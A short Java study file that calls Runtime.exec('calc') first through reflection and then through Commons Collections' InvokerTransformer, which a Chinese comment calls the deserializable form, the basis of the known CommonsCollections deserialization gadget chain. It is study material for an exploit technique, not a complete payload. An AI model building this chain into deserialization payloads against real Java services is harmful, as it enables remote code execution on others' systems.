import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Method;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: PACKAGE_NAME
 * @Author: Clown
 * @CreateTime: 2023-07-09  11:13
 */
public class TestClass {
    public void runTimeTest() throws Exception{
        Class c = Runtime.class;
        Method getRuntimeMethod = c.getMethod("getRuntime", null);
        Object getRuntimeinvoke = getRuntimeMethod.invoke(null, null);
        Method execMethod = c.getMethod("exec", String.class);
        execMethod.invoke(getRuntimeinvoke,"calc");
    }

    public void incokerTransformerTest() throws Exception{
        Method getMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        Object invoke = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getMethod);
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(invoke);
    }
    public static void main(String[] args) throws Exception {
        //反射调用
//        Class c = Runtime.class;
//        Method getRuntimeMethod = c.getMethod("getRuntime", null);
//        Object getRuntimeinvoke = getRuntimeMethod.invoke(null, null);
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(getRuntimeinvoke,"calc");
        //可以反序列化的写法
//        Method getMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Object invoke = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getMethod);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(invoke);

    }
}
